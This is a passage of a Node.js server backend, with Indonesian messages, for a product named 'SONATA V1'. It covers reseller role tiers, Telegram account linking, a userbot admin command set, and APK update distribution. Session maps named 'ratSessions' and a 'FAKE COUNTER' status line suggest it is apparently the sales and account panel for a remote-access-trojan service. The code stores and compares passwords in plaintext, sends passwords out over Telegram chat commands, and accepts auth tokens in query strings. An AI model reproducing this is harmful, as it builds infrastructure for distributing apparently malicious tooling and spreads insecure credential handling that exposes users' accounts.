      throw new Error('Gagal extract tar.gz (tar tidak tersedia atau file rusak)');
    }
  }

  try { fs.unlinkSync(tarPath); } catch (_) {}

  const bin = findLocalJavaBinary();
  if (!bin) {
    throw new Error('Extract berhasil tapi binary java tidak ditemukan di folder jdk/');
  }
  try { fs.chmodSync(bin, 0o755); } catch (_) {}

  execSync(`"${bin}" -version`, { stdio: 'ignore', timeout: 5000 });
  JAVA_BIN_CACHED = bin;
  return bin;
}

function tryInstallJavaAsync() {
  return new Promise(async (resolve) => {
    if (isJavaInstalled()) {
      const v = getJavaVersionString();
      console.log(`[JAVA] ✅ Terdeteksi: ${v || 'OK'} (${findJavaBinary()})`);
      return resolve(true);
    }

    console.log('[JAVA] ⚠️ Java tidak terdeteksi. Mulai auto-fix...');

    const attempts = [
      { name: 'apt-get', cmd: 'apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq openjdk-17-jre-headless' },
      { name: 'apk',     cmd: 'apk add --no-cache openjdk17-jre-headless' },
      { name: 'dnf',     cmd: 'dnf install -y java-17-openjdk-headless' },
      { name: 'yum',     cmd: 'yum install -y java-17-openjdk-headless' },
    ];

    for (const a of attempts) {
      console.log(`[JAVA] 🔄 Coba via ${a.name}...`);
      try {
        await new Promise((res, rej) => {
          exec(a.cmd, { timeout: 180000 }, (err) => (err ? rej(err) : res()));
        });
        if (isJavaInstalled()) {
          console.log(`[JAVA] ✅ Berhasil install via ${a.name}`);
          console.log(`[JAVA] Versi: ${getJavaVersionString()}`);
          return resolve(true);
        }
      } catch (_) {}
    }

    console.log('[JAVA] 🔄 Package manager gagal. Coba download portable JRE...');
    try {
      const bin = await downloadPortableJdk();
      console.log(`[JAVA] ✅ Portable JRE siap: ${bin}`);
      console.log(`[JAVA] Versi: ${getJavaVersionString()}`);
      return resolve(true);
    } catch (e) {
      console.log(`[JAVA] ❌ Gagal download portable JRE: ${e.message}`);
      console.log('[JAVA] ⚠️ Auto Builder belum bisa dipakai sampai Java tersedia.');
      return resolve(false);
    }
  });
}

function getJavaBin() {
  return findJavaBinary();
}

let JAVA_BIN = findJavaBinary();
setInterval(() => {
  try { JAVA_BIN = findJavaBinary(); } catch (_) {}
}, 30000);

// ═══════════════════════════════════════════════════════════════════════
//  AUTO REFRESH
// ═══════════════════════════════════════════════════════════════════════
async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 1/15");
console.log("    STATUS : HEADER + CONFIG + FAKE COUNTER OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

// ═══════════════════════════════════════════════════════════════════════
//  Part 2/15: ROLE SYSTEM + TELEGRAM CONFIG
// ═══════════════════════════════════════════════════════════════════════

const TELEGRAM_JSON = path.join(__dirname, 'telegram.json');

const DEFAULT_TELEGRAM_CFG = {
  ownerList: [],
  devList: [],
  allowedGroups: [],
  groups: {}
};

function loadTelegramConfig() {
  try {
    if (!fs.existsSync(TELEGRAM_JSON)) {
      fs.writeFileSync(TELEGRAM_JSON, JSON.stringify(DEFAULT_TELEGRAM_CFG, null, 2));
      return { ...DEFAULT_TELEGRAM_CFG };
    }
    const raw = JSON.parse(fs.readFileSync(TELEGRAM_JSON, 'utf8'));
    return {
      ownerList: raw.ownerList || [],
      devList: raw.devList || [],
      allowedGroups: raw.allowedGroups || [],
      groups: raw.groups || {}
    };
  } catch {
    return { ...DEFAULT_TELEGRAM_CFG };
  }
}

function saveTelegramConfig(cfg) {
  fs.writeFileSync(TELEGRAM_JSON, JSON.stringify(cfg, null, 2));
}

function getGroupRole(chatId) {
  const cfg = loadTelegramConfig();
  return cfg.groups[String(chatId)] || null;
}

function getGroupsByRole(role) {
  const cfg = loadTelegramConfig();
  const target = String(role || '').toUpperCase();
  return Object.entries(cfg.groups)
    .filter(([_, r]) => String(r).toUpperCase() === target)
    .map(([gid]) => Number(gid))
    .filter(Number.isFinite);
}

function isDevUser(userId) {
  const cfg = loadTelegramConfig();
  const id = Number(userId);
  return (cfg.devList || []).map(Number).includes(id) ||
         (cfg.ownerList || []).map(Number).includes(id);
}

const ROLE_HIERARCHY = ['pemula', 'owner', 'reseller', 'fullup', 'member'];
const ROLE_LEVEL = { pemula: 100, dev: 100, owner: 80, reseller: 60, fullup: 40, member: 20 };
const CAN_CREATE_ROLES = {
  pemula: ['owner','reseller','fullup','member'],
  owner: ['reseller','fullup','member'],
  reseller: ['fullup','member'],
  fullup: [],
  member: []
};
const CANNOT_CREATE_ROLES = ['member', 'fullup'];
const GROUP_ROLES_VALID = ['OWNER','RESELLER','FULLUP'];

const BERKAH_CONFIG = {
  ALLOWED_ROLES: ['member', 'reseller', 'fullup', 'owner'],
  DURATION_DAYS: 99,
  MAX_PER_BATCH: 10,
  OWNER_DAILY_CAP: 3,
  USERNAME_PREFIX: 'brk_',
  USERNAME_HEX_LEN: 6,
  PASSWORD_LEN: 10,
  HISTORY_FILE: path.join(__dirname, 'berkah_history.json')
};

function loadBerkahHistory() {
  try {
    if (!fs.existsSync(BERKAH_CONFIG.HISTORY_FILE)) return {};
    return JSON.parse(fs.readFileSync(BERKAH_CONFIG.HISTORY_FILE, 'utf8')) || {};
  } catch { return {}; }
}
function saveBerkahHistory(d) {
  fs.writeFileSync(BERKAH_CONFIG.HISTORY_FILE, JSON.stringify(d, null, 2));
}
function todayKey() {
  return new Date().toISOString().split('T')[0];
}
function getBerkahOwnerCountToday(creatorUsername) {
  const h = loadBerkahHistory();
  const day = todayKey();
  const rec = h[creatorUsername] || {};
  return Number(rec[day]?.owner || 0);
}
function incrementBerkahOwnerToday(creatorUsername, n) {
  const h = loadBerkahHistory();
  const day = todayKey();
  h[creatorUsername] = h[creatorUsername] || {};
  h[creatorUsername][day] = h[creatorUsername][day] || { owner: 0 };
  h[creatorUsername][day].owner = Number(h[creatorUsername][day].owner || 0) + n;
  const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString().split('T')[0];
  for (const u of Object.keys(h)) {
    for (const d of Object.keys(h[u])) {
      if (d < cutoff) delete h[u][d];
    }
    if (Object.keys(h[u]).length === 0) delete h[u];
  }
  saveBerkahHistory(h);
}

function getSessionUserFromRequest(req) {
  const key = req.headers['x-auth-token'] || req.query.key || req.body?.key;
  const info = activeKeys[key];
  if (!info) return null;
  const db = loadDatabase();
  return db.find(u => u.username === info.username) || null;
}

function normalizeGroupRole(role) {
  const r = String(role || '').trim().toUpperCase();
  return GROUP_ROLES_VALID.includes(r) ? r : null;
}

function getUserGroupLink(user) {
  const link = user?.groupLink;
  if (!link || typeof link !== 'object') return null;
  return link.inviteLink ? link : null;
}

function saveUserGroupLink(user, link) {
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === user.username);
  if (idx < 0) return false;
  db[idx].groupLink = link;
  db[idx].groupLinkCreatedAt = link.claimedAt;
  saveDatabase(db);
  const meta = loadDatabaseMeta();
  const owner = {
    accountUid: String(db[idx].uid || ''),
    username: String(db[idx].username || ''),
    telegramId: String(db[idx].telegramId || ''),
    groupRole: String(link.groupRole || ''),
    groupId: String(link.groupId || ''),
    inviteLink: String(link.inviteLink || ''),
    claimedAt: link.claimedAt || new Date().toISOString()
  };
  const pos = meta.groupLinkOwners.findIndex(x => x.accountUid === owner.accountUid || x.username === owner.username);
  if (pos >= 0) meta.groupLinkOwners[pos] = owner; else meta.groupLinkOwners.push(owner);
  saveDatabaseMeta(meta);
  rememberUserIdentity(db[idx], 'GROUP_LINK');
  return true;
}

app.post('/api/telegram/link', (req, res) => {
  const username = String(req.body.username || '').trim();
  const password = String(req.body.password || '');
  const telegramId = String(req.body.telegramId || '').trim();
  if (!/^\d{5,20}$/.test(telegramId) || !username || !password)
    return res.status(400).json({ok:false,message:'Username, password, dan ID Telegram valid wajib diisi.'});
  const db = loadDatabase();
  const account = db.find(u => String(u.username).toLowerCase() === username.toLowerCase() && String(u.password) === password);
  if (!account) return res.status(401).json({ok:false,message:'Username atau password salah.'});
  const already = db.find(u => String(u.telegramId || '') === telegramId && u.username !== account.username);
  if (already) return res.status(409).json({ok:false,message:'ID Telegram sudah terikat ke akun lain.'});
  if (account.telegramId && String(account.telegramId) !== telegramId)
    return res.status(409).json({ok:false,message:'Akun ini sudah terikat ke ID Telegram lain.'});
  account.telegramId = telegramId;
  account.telegramLinkedAt = account.telegramLinkedAt || new Date().toISOString();
  saveDatabase(db);
  rememberUserIdentity(account, 'TELEGRAM_LINK');
  return res.json({ok:true,username:account.username,role:String(account.role || 'member').toUpperCase(),telegramId,linkedAt:account.telegramLinkedAt});
});

app.get('/api/telegram/accounts', (req, res) => {
  const telegramId = String(req.query.telegramId || '').trim();
  if (!/^\d{5,20}$/.test(telegramId)) return res.status(400).json({ok:false,message:'ID Telegram tidak valid.'});
  const db = loadDatabase();
  const linked = db.filter(u => String(u.telegramId || '') === telegramId);
  const history = loadCreateHistory().filter(h => linked.some(u => u.username === h.username));
  const incomeItems = loadPurchases().filter(x => String(x.telegramId || '') === telegramId && String(x.status).toLowerCase() === 'accepted');
  return res.json({
    ok: true,
    accounts: linked.map(u => ({
      username: u.username,
      role: String(u.role || 'member').toUpperCase(),
      expiredDate: u.expiredDate || null,
      createdAt: u.createdAt || null,
      createdBy: u.createdBy || null
    })),
    history: history.map(h => ({ username: h.username, role: h.role, status: h.status, createdAt: h.createdAt || null })),
    totalIncome: incomeItems.reduce((n, x) => n + (Number(x.price) || 0), 0)
  });
});

app.get('/api/group-links', async (req, res) => {
  try {
    const user = getSessionUserFromRequest(req);
    if (!user) return res.status(401).json({ ok: false, message: 'Unauthorized' });

    const role = normalizeGroupRole(user.role);
    const existing = getUserGroupLink(user);
    if (existing) {
      return res.json({
        ok: true, role: role || String(user.role || 'member').toUpperCase(),
        groups: [{
          role: existing.groupRole,
          available: true,
          claimed: true,
          link: existing.inviteLink,
          claimedAt: existing.claimedAt || null,
        }]
      });
    }

    if (!role) return res.json({ ok: true, role: String(user.role || 'member').toUpperCase(), groups: [] });
    const groupIds = getGroupsByRole(role);
    return res.json({
      ok: true,
      role,
      groups: [{
        role,
        available: groupIds.length > 0,
        claimed: false,
        link: null,
        claimedAt: null,
      }]
    });
  } catch (err) {
    console.error('[GROUP LINK] list:', err.message);
    res.status(500).json({ ok: false, message: 'Gagal memuat group link.' });
  }
});

app.post('/api/group-links/claim', async (req, res) => {
  try {
    const user = getSessionUserFromRequest(req);
    if (!user) return res.status(401).json({ ok: false, message: 'Unauthorized' });

    const role = normalizeGroupRole(user.role);
    if (!role) return res.status(403).json({ ok: false, message: 'Role akun belum memiliki group link.' });

    const existing = getUserGroupLink(user);
    if (existing) {
      return res.json({ ok: true, alreadyClaimed: true, link: existing.inviteLink, groupRole: existing.groupRole });
    }

    const groups = getGroupsByRole(role);
    if (!groups.length) return res.status(404).json({ ok: false, message: `Belum ada group untuk role ${role}.` });

    let invite;
    try {
      invite = await bot.createChatInviteLink(groups[0], {
        member_limit: 1,
        name: `SONATA ${role} ${user.username || user.uid || 'USER'}`,
      });
    } catch (e) {
      return res.status(502).json({ ok: false, message: `Bot tidak bisa membuat link group: ${e.message}` });
    }

    const claim = {
      accountUid: String(user.uid || ''),
      username: String(user.username || ''),
      telegramId: String(user.telegramId || ''),
      groupRole: role,
      groupId: String(groups[0]),
      inviteLink: invite.invite_link,
      claimedAt: new Date().toISOString(),
      source: 'APK',
    };

    if (!saveUserGroupLink(user, claim)) {
      return res.status(500).json({ ok: false, message: 'Gagal menyimpan link ke database.json.' });
    }

    return res.json({ ok: true, alreadyClaimed: false, link: claim.inviteLink, groupRole: claim.groupRole });
  } catch (err) {
    console.error('[GROUP LINK] claim:', err.message);
    res.status(500).json({ ok: false, message: 'Gagal menyimpan kepemilikan link.' });
  }
});

const ROLE_QUOTA = {
  pemula:   { owner: Infinity, reseller: Infinity, fullup: Infinity, member: Infinity },
  owner:    { reseller: 50, fullup: 200, member: 999 },
  reseller: { fullup: 20, member: 100 },
  fullup:   {},
  member:   {}
};

function getTrialExpiry(duration) {
  if (!duration || duration === 'permanent') return null;
  const now = new Date();
  if (duration === '3m')  { now.setMinutes(now.getMinutes() + 3);  return now.toISOString(); }
  if (duration === '5m')  { now.setMinutes(now.getMinutes() + 5);  return now.toISOString(); }
  if (duration === '10m') { now.setMinutes(now.getMinutes() + 10); return now.toISOString(); }
  if (duration === '3d')  { now.setDate(now.getDate() + 3);  return now.toISOString(); }
  if (duration === '7d')  { now.setDate(now.getDate() + 7);  return now.toISOString(); }
  if (duration === '30d') { now.setDate(now.getDate() + 30); return now.toISOString(); }
  return null;
}

const ratSessions = {};
// ─── FIX: pending command ACK map ─────────────────────────────────────
const ratPendingCommands = {};

function loadRatAccounts() {
  try {
    const db = loadDatabase();
    const result = {};
    for (const user of db) {
      const uid = user.uid || crypto.createHash('md5').update(user.username).digest('hex');
      result[user.username] = {
        password: user.password,
        displayName: user.username,
        role: user.role || 'member',
        uid: uid,
        createdBy: 'system',
        createdAt: user.createdAt || new Date().toISOString(),
        trialDuration: 'permanent',
        trialExpiry: user.expiredDate ? new Date(user.expiredDate).toISOString() : null
      };
    }
    return result;
  } catch (e) {
    console.error('[loadRatAccounts]', e.message);
    return {};
  }
}

function ratGenToken() {
  return crypto.randomBytes(24).toString('hex');
}

function ratGetRole(username) {
  const db = loadDatabase();
  const u = db.find(x => x.username === username);
  const role = String(u?.role || 'member').toLowerCase();
  return ['dev','kingz'].includes(role) ? 'pemula' : role;
}

function ratRoleIndex(role) {
  return ROLE_HIERARCHY.indexOf(role);
}

function ratGetQuotaUsed(creator, targetRole) {
  const a = loadRatAccounts();
  return Object.values(a).filter(x => x.createdBy === creator && x.role === targetRole).length;
}

function ratGetQuotaLimit(creator, targetRole) {
  const a = loadRatAccounts();
  const acc = a[creator];
  if (!acc) return 0;
  const myRole = acc.role || 'member';
  if (myRole === 'pemula') return Infinity;
  const base = (ROLE_QUOTA[myRole] || {})[targetRole];
  if (base === undefined) return 0;
  return base;
}

function ratDeleteExpired() {
  const db = loadDatabase();
  const now = new Date();
  let deleted = 0;

  for (let i = db.length - 1; i >= 0; i--) {
    const user = db[i];
    if (!user.expiredDate) continue;
    if (new Date(user.expiredDate) <= now) {
      for (const [tok, sess] of Object.entries(ratSessions)) {
        if (sess.username === user.username) delete ratSessions[tok];
      }
      db.splice(i, 1);
      deleted++;
      console.log(`\x1b[31m[TRIAL]\x1b[0m Akun "${user.username}" dihapus otomatis (expired)`);
    }
  }

  if (deleted > 0) saveDatabase(db);
}

setInterval(ratDeleteExpired, 60 * 1000);

function ratRequireAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token || req.query.key;
  if (!token) {
    return res.status(401).json({ ok: false, error: 'Unauthorized', message: 'Token auth wajib.' });
  }

  let username = ratSessions[token]?.username || null;
  let uid = ratSessions[token]?.uid || null;

  if (!username) {
    const legacy = activeKeys[token];
    if (legacy && legacy.username) {
      username = legacy.username;
    } else {
      try {
        const list = loadKeyList();
        const row = Array.isArray(list) ? list.find(e => e && e.sessionKey === token) : null;
        if (row && row.username) username = row.username;
      } catch (_) {}
    }
  }

  if (!username) {
    return res.status(401).json({ ok: false, error: 'Unauthorized', message: 'Sesi tidak valid atau sudah logout.' });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username);

  if (!user) {
    if (ratSessions[token]) delete ratSessions[token];
    if (activeKeys[token]) delete activeKeys[token];
    return res.status(401).json({ ok: false, error: 'Akun tidak ditemukan', message: 'Akun tidak ditemukan' });
  }

  if (user.expiredDate && new Date(user.expiredDate) <= new Date()) {
    for (const [tok, sess] of Object.entries(ratSessions)) {
      if (sess.username === username) delete ratSessions[tok];
    }
    for (const [tok, info] of Object.entries(activeKeys)) {
      if (info && info.username === username) delete activeKeys[tok];
    }
    const idx = db.findIndex(u => u.username === username);
    if (idx !== -1) { db.splice(idx, 1); saveDatabase(db); }
    return res.status(401).json({ ok: false, error: 'Akun kamu sudah expired', message: 'Akun kamu sudah expired' });
  }

  if (!ratSessions[token]) {
    const bridgedUid = uid || user.uid || crypto.createHash('md5').update(user.username).digest('hex');
    ratSessions[token] = { username: user.username, uid: bridgedUid };
    uid = bridgedUid;
  }

  req.username = username;
  req.uid = uid || ratSessions[token]?.uid || user.uid || '';
  next();
}

function getUpdateMeta() {
  const db = loadDatabase();
  const meta = db.find(x => x && x._meta === true) || {};
  return meta.appUpdate || null;
}
function setUpdateMeta(update) {
  const db = loadDatabase();
  let meta = db.find(x => x && x._meta === true);
  if (!meta) { meta = {_meta:true, username:'__SONATA_DATABASE_META__', version:2}; db.unshift(meta); }
  meta.appUpdate = update;
  saveDatabase(db);
}
function requireDev(req,res,next){
  ratRequireAuth(req,res,()=>{
    const role = String(ratGetRole(req.username)||'').toLowerCase();
    if(!['pemula'].includes(role)) return res.status(403).json({ok:false,error:'PEMULA role required'});
    next();
  });
}

// ═══════════════════════════════════════════════════════════════════════
//  PEMULA USERBOT
// ═══════════════════════════════════════════════════════════════════════
const USERBOT_SESSION_FILE = path.join(__dirname, 'userbot.session');
const USERBOT_CONFIG_FILE = path.join(__dirname, 'userbot.config.json');
function readUserbotConfig() { try { return JSON.parse(fs.readFileSync(USERBOT_CONFIG_FILE, 'utf8')); } catch (_) { return {}; } }
function saveUserbotConfig(data) { fs.writeFileSync(USERBOT_CONFIG_FILE, JSON.stringify(data, null, 2), { mode: 0o600 }); }
let userbotClient = null;
let userbotPending = null;
let userbotStarting = false;
function userbotStatus() {
  return { connected: !!userbotClient, phone: String(readUserbotConfig().phone || process.env.USERBOT_PHONE || ''), singleAccount: true };
}
function userbotApiCredentials() {
  const apiId = Number.parseInt(process.env.TELEGRAM_API_ID || '', 10);
  const apiHash = String(process.env.TELEGRAM_API_HASH || '').trim();
  if (!Number.isInteger(apiId) || apiId <= 0 || !apiHash) throw new Error('TELEGRAM_API_ID dan TELEGRAM_API_HASH wajib diisi di .env server.');
  return { apiId, apiHash };
}
async function attachUserbotCommands(client) {
  client.addEventHandler(async (event) => {
    try {
      const msg = event.message;
      const ownerId = String(process.env.USERBOT_OWNER_ID || process.env.OWNER_ID || '').trim();
      if (!ownerId || !event.isPrivate || !msg || msg.out) return;
      const senderId = String(msg.senderId || '');
      if (senderId !== ownerId) return;
      const raw = String(msg.message || '').trim();
      if (!raw.startsWith('.')) return;
      const reply = async (message) => client.sendMessage(senderId, { message: String(message).slice(0, 3800) });
      const db = loadDatabase();
      const users = db.filter(u => u && u.username && !u._meta);
      if (raw === '.ping') {
        const start = Date.now();
        const mem = process.memoryUsage();
        return reply(`╭━━ SONATA STATUS ━━╮\nAPI: ONLINE\nPING: ${Date.now()-start} ms (internal)\nAPK USERS: ${users.length}\nRAM: ${(mem.rss/1024/1024).toFixed(0)} MB\n╰━━━━━━━━━━━━━━━━━━╯`);
      }
      if (raw.startsWith('.cakun ')) {
        const parts = raw.slice(7).split(',').map(x => x.trim());
        if (parts.length < 4) return reply('Format: .cakun username,password,role,durasi (contoh: .cakun user1,Pass123,member,30d)');
        const [username,password,roleRaw,durationRaw] = parts;
        const role = roleRaw.toLowerCase();
        const daysMatch = durationRaw.toLowerCase().match(/^(\d+)(d|hari|day|m|bulan|month)?$/);
        const days = daysMatch ? Number(daysMatch[1]) * (['m','bulan','month'].includes(daysMatch[2]) ? 30 : 1) : NaN;
        const allowed = ['member','fullup','reseller','pt','tk','owner','kingz'];
        if (!/^[a-zA-Z0-9_.-]{3,32}$/.test(username) || password.length < 4 || !allowed.includes(role) || !Number.isInteger(days) || days < 1 || days > 3650) return reply('Data tidak valid.');
        if (users.some(u => String(u.username).toLowerCase() === username.toLowerCase())) return reply('Username sudah digunakan.');
        const account = buildAccountObject({ username, password, role, day: days, createdBy: 'PEMULA_USERBOT' });
        db.push(account); saveDatabase(db);
        try { rememberUserIdentity(account, 'PEMULA_USERBOT'); pushCreateHistory({ username, role, createdBy:'PEMULA_USERBOT', createdAt:new Date().toISOString(), expiredDate:account.expiredDate }); } catch (_) {}
        return reply(`AKUN BERHASIL DIBUAT\nUsername: ${username}\nPassword: ${password}\nRole: ${role.toUpperCase()}\nDurasi: ${days} hari\nExpired: ${account.expiredDate}`);
      }
      if (raw.startsWith('.cekakun ')) {
        const username = raw.slice(9).trim();
        const u = users.find(x => String(x.username).toLowerCase() === username.toLowerCase());
        if (!u) return reply('Akun tidak ditemukan.');
        const remaining = u.expiredDate ? Math.max(0, Math.ceil((new Date(u.expiredDate+'T23:59:59Z')-Date.now())/86400000)) : 'tidak dibatasi';
        return reply(`CEK AKUN\nUsername: ${u.username}\nPassword: ${u.password || '(tidak tersedia)'}\nRole: ${String(u.role||'member').toUpperCase()}\nExpired: ${u.expiredDate||'-'}\nSisa durasi: ${remaining}${typeof remaining==='number'?' hari':''}`);
      }
      if (raw.startsWith('.deluser ')) {
        const username = raw.slice(9).trim();
        const idx = db.findIndex(u => u && !u._meta && String(u.username).toLowerCase() === username.toLowerCase());
        if (idx < 0) return reply('Akun tidak ditemukan.');
        if (['dev','kingz','pemula'].includes(String(db[idx].role||'').toLowerCase())) return reply('Akun PEMULA dilindungi.');
        const removed = db.splice(idx,1)[0]; saveDatabase(db);
        for (const [token,session] of Object.entries(ratSessions)) if (session.username === removed.username) delete ratSessions[token];
        return reply(`Akun ${removed.username} dihapus dan sesi aktifnya dicabut.`);
      }
      if (raw === '.allreset') {
        const changed = [];
        for (const u of users) {
          if (['dev','kingz','pemula'].includes(String(u.role||'').toLowerCase())) continue;
          const pass = crypto.randomBytes(6).toString('base64url');
          u.password = pass; changed.push(`${u.username} : ${pass}`);
        }
        saveDatabase(db);
        if (!changed.length) return reply('Tidak ada akun yang dapat direset.');
        await reply(`RESET PASSWORD: ${changed.length} akun.`);
        for (let i=0;i<changed.length;i+=25) await reply('HASIL RESET\n'+changed.slice(i,i+25).join('\n'));
        return;
      }
      if (raw.startsWith('.uprole ')) {
        const parts = raw.slice(8).split(',').map(x=>x.trim());
        if (parts.length !== 2) return reply('Format: .uprole username,role');
        const [username,roleRaw] = parts; const role=roleRaw.toLowerCase();
        const allowed = ['member','fullup','reseller','pt','tk','owner','kingz'];
        const u = users.find(x => String(x.username).toLowerCase() === username.toLowerCase());
        if (!u) return reply('Akun tidak ditemukan.');
        if (!allowed.includes(role)) return reply('Role tidak valid.');
        if (['dev','kingz','pemula'].includes(String(u.role||'').toLowerCase())) return reply('Akun PEMULA dilindungi.');
        const old = String(u.role||'member'); u.role=role; saveDatabase(db);
        return reply(`Role ${u.username}: ${old.toUpperCase()} → ${role.toUpperCase()}`);
      }
      if (raw === '.help' || raw === '.commands') return reply('.cakun username,password,role,durasi\n.cekakun username\n.deluser username\n.allreset\n.ping\n.uprole username,role');
    } catch (e) { console.error('[USERBOT COMMAND]', e.message); }
  }, new NewMessage({ incoming: true }));
}
function requireSecureUserbotTransport(req,res,next) {
  const forwarded = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim();
  if (!req.secure && forwarded !== 'https') return res.status(426).json({ok:false,message:'Login OTP Telegram wajib melalui HTTPS.'});
  next();
}
app.get('/api/dev/userbot/status', requireDev, (req,res) => res.json({ok:true,...userbotStatus()}));
app.post('/api/dev/userbot/request-code', requireDev, requireSecureUserbotTransport, async (req,res) => {
  if (userbotStarting) return res.status(409).json({ok:false,message:'Proses userbot sedang berjalan.'});
  const phone = String(req.body.phone || '').trim();
  if (!/^\+[1-9]\d{7,14}$/.test(phone)) return res.status(400).json({ok:false,message:'Masukkan nomor format internasional.'});
  try {
    const ownerId = String(process.env.USERBOT_OWNER_ID || process.env.OWNER_ID || '').trim();
    if (!/^\d+$/.test(ownerId)) return res.status(503).json({ok:false,message:'USERBOT_OWNER_ID belum diisi di .env.'});
    userbotStarting = true;
    const {apiId,apiHash}=userbotApiCredentials();
    if (userbotClient) { try { await userbotClient.disconnect(); } catch (_) {} userbotClient=null; }
    const client = new TelegramClient(new StringSession(''), apiId, apiHash, {connectionRetries:1, autoReconnect:false});
    await client.connect();
    const sent = await client.sendCode({apiId,apiHash}, phone);
    userbotPending = {client,phone,phoneCodeHash:sent.phoneCodeHash,expiresAt:Date.now()+5*60*1000};
    res.json({ok:true,message:'Kode login diminta. Masukkan kode dalam 5 menit.'});
  } catch(e) { if(userbotPending?.client){try{await userbotPending.client.disconnect()}catch(_){}} userbotPending=null; res.status(400).json({ok:false,message:'Gagal minta kode: '+String(e.message||e).slice(0,200)}); }
  finally { userbotStarting=false; }
});
app.post('/api/dev/userbot/verify-code', requireDev, requireSecureUserbotTransport, async (req,res) => {
  const code=String(req.body.code||'').trim(); const password=String(req.body.password2fa||'');
  if(!userbotPending || userbotPending.expiresAt<Date.now()) return res.status(400).json({ok:false,message:'Sesi OTP kedaluwarsa.'});
  const p=userbotPending;
  try {
    const {apiId,apiHash}=userbotApiCredentials();
    try { await p.client.signIn({phoneNumber:p.phone,phoneCode:async()=>code,phoneCodeHash:p.phoneCodeHash}); }
    catch(e) {
      if(String(e.errorMessage||e.message||'').includes('SESSION_PASSWORD_NEEDED')) {
        if(!password) return res.status(428).json({ok:false,needs2fa:true,message:'Akun memakai password 2FA.'});
        await p.client.signInWithPassword({apiId,apiHash},{password:async()=>password,onError:(err)=>{throw err;}});
      } else throw e;
    }
    const me=await p.client.getMe();
    const ownerId=String(process.env.USERBOT_OWNER_ID||process.env.OWNER_ID||'').trim();
    if(!ownerId) throw new Error('USERBOT_OWNER_ID harus diisi.');
    const session=p.client.session.save();
    fs.writeFileSync(USERBOT_SESSION_FILE,session,{mode:0o600});
    process.env.USERBOT_PHONE=p.phone; saveUserbotConfig({ phone: p.phone, updatedAt: new Date().toISOString() });
    userbotClient=p.client; userbotPending=null;
    await attachUserbotCommands(userbotClient);
    return res.json({ok:true,connected:true,phone:p.phone,telegramUserId:String(me.id),message:'Userbot terhubung.'});
  } catch(e) {
    if(String(e.errorMessage||e.message||'').includes('SESSION_PASSWORD_NEEDED')) return res.status(428).json({ok:false,needs2fa:true,message:'Masukkan password 2FA.'});
    return res.status(400).json({ok:false,message:'Verifikasi gagal: '+String(e.message||e).slice(0,200)});
  }
});
app.post('/api/dev/userbot/disconnect', requireDev, async (req,res) => {
  try { if(userbotClient) await userbotClient.disconnect(); } catch(_) {}
  userbotClient=null; userbotPending=null;
  try { if(fs.existsSync(USERBOT_SESSION_FILE)) fs.unlinkSync(USERBOT_SESSION_FILE); } catch(_) {}
  return res.json({ok:true,connected:false,message:'Sesi userbot diputus.'});
});
(async()=>{ try {
  if(!fs.existsSync(USERBOT_SESSION_FILE)) return;
  const {apiId,apiHash}=userbotApiCredentials();
  const session=fs.readFileSync(USERBOT_SESSION_FILE,'utf8').trim(); if(!session) return;
  process.env.USERBOT_PHONE = String(readUserbotConfig().phone || '');
  const client=new TelegramClient(new StringSession(session),apiId,apiHash,{connectionRetries:2});
  await client.connect();
  if(await client.checkAuthorization()) { userbotClient=client; await attachUserbotCommands(client); console.log('[USERBOT] single account session restored'); }
  else await client.disconnect();
} catch(e) { console.error('[USERBOT] restore failed:',e.message); } })();

app.get('/api/app-update', (req,res) => {
  const u = getUpdateMeta();
  if(!u) return res.json({ok:true,available:false});
  const downloadUrl = u.fileName ? `${req.protocol}://${req.get('host')}/updates/${encodeURIComponent(u.fileName)}` : '';
  res.json({ok:true,available:true,version:u.version,build:u.build,description:u.description||'',force:!!u.force,downloadUrl,updatedAt:u.updatedAt||null});
});

app.post('/api/dev/app-update', requireDev, uploadUpdate.single('apk'), (req,res) => {
  if(!req.file) return res.status(400).json({ok:false,error:'APK wajib diupload'});
  const version=String(req.body.version||'').trim();
  const build=Number.parseInt(String(req.body.build||''),10);
  if(!/^\d+\.\d+\.\d+$/.test(version) || !Number.isInteger(build) || build<1){
    try{fs.unlinkSync(req.file.path)}catch{}
    return res.status(400).json({ok:false,error:'Versi harus x.y.z dan build angka'});
  }
  const previous=getUpdateMeta();
  if(previous && build <= Number(previous.build||0)){
    try{fs.unlinkSync(req.file.path)}catch{}
    return res.status(409).json({ok:false,error:`Build harus lebih besar dari ${previous.build}`});
  }
  const ext='.apk';
  const safeName=`sonata-${version.replace(/[^0-9.]/g,'_')}-${build}-${Date.now()}${ext}`;
  const finalPath=path.join(UPDATES_DIR,safeName);
  fs.renameSync(req.file.path,finalPath);
  const update={version,build,description:String(req.body.description||'').slice(0,5000),force:String(req.body.force||'false')==='true',fileName:safeName,fileSize:fs.statSync(finalPath).size,updatedAt:new Date().toISOString(),publishedBy:req.username};
  setUpdateMeta(update);
  res.json({ok:true,update,downloadUrl:`${req.protocol}://${req.get('host')}/updates/${encodeURIComponent(safeName)}`});
});

app.delete('/api/dev/app-update', requireDev, (req,res) => {
  const u=getUpdateMeta();
